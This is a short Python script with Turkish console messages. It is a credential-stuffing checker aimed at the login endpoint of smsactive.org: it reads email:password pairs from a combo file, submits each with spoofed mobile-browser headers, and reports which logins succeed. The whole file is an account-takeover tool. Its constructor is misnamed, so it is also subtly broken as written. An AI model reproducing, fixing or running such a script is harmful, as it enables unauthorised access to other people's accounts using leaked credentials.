import requests as req, os as sy
try:
    from cfonts import render as rd
except ImportError:
    sy.system('pip install python-cfonts')
    from cfonts import render as rd

class RKLoginCkr:
    def init(s):
        s.url, s.hdrs = "https://smsactive.org/ajax/login", {
            'authority':'smsactive.org','accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8',
            'origin':'https://smsactive.org','referer':'https://smsactive.org/login','sec-ch-ua':'"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty','sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with':'XMLHttpRequest'
        }

    def login_chk(s, e, p):
        r = req.post(s.url, data=f"email={e}&password={p}", headers=s.hdrs)
        try: rsp = r.json()
        except ValueError: 
            print(f"\033[1;31mYanıt JSON formatında değil ❌: {e}:{p}"); return
        print(f"\033[2;32mBaşarılı Giriş ✅: {e}:{p}") if rsp.get("status")=="ok" and rsp.get("user", {}).get("OK") else print(f"\033[1;31mBaşarısız Giriş ❌: {e}:{p}")

    def rk_tf_fm_f(s, c):
        with open(c, "r") as f:
            for l in f:
                l = l.strip()
                s.login_chk(*l.split(":", 1)) if ":" in l else print(f"\033[1;31mBaşarısız Giriş ❌: {l}")

print(rd('  SMS     ACTIVE ', colors=['white','blue'], align='center'))

combo = input("\033[2;35mCombo Yolu: ")
RKLoginCkr().rk_tf_fm_f(combo)
